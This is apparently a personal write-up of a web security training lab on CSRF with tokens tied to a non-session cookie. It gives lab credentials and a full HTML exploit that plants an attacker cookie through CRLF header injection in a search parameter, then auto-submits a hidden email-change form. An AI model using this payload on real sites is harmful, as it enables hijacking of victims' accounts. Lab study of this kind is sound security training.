# CSRF where token is tied to non-session cookie

This lab's email change functionality is vulnerable to CSRF.
 It uses tokens to try to prevent CSRF attacks, but they aren't fully 
integrated into the site's session handling system.

To solve the lab, use your exploit server to host an HTML 
page that uses a CSRF attack to change the viewer's email address.

You have two accounts on the application that you can use to
 help design your attack. The credentials are as follows:

- `wiener:peter`
- `carlos:montoya`

```html
<html>
  <!-- CSRF exploit - change carlos's email -->
  <body>
    <form action="https://0a8000360320837c81c1f7b3000300b8.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacked@evil.com" />
      <input type="hidden" name="csrf" value="Q3uNlfqOZvP8y0EYZxYnmlUIYMKw01o7" />
    </form>

    <!-- Step 1: Inject attacker's csrfKey cookie into victim's browser -->
    <img src="https://0a8000360320837c81c1f7b3000300b8.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=pzoIey2HGYOO2iMefzU2bI4q4OeU7bAF;%20SameSite=None"
         onerror="document.forms[0].submit()" />

    <!-- The onerror ensures the form submits even if the img fails to load -->
  </body>
</html>

```

![image.png](CSRF%20where%20token%20is%20tied%20to%20non-session%20cookie/image.png)

![image.png](CSRF%20where%20token%20is%20tied%20to%20non-session%20cookie/image%201.png)

![image.png](CSRF%20where%20token%20is%20tied%20to%20non-session%20cookie/image%202.png)

![image.png](CSRF%20where%20token%20is%20tied%20to%20non-session%20cookie/image%203.png)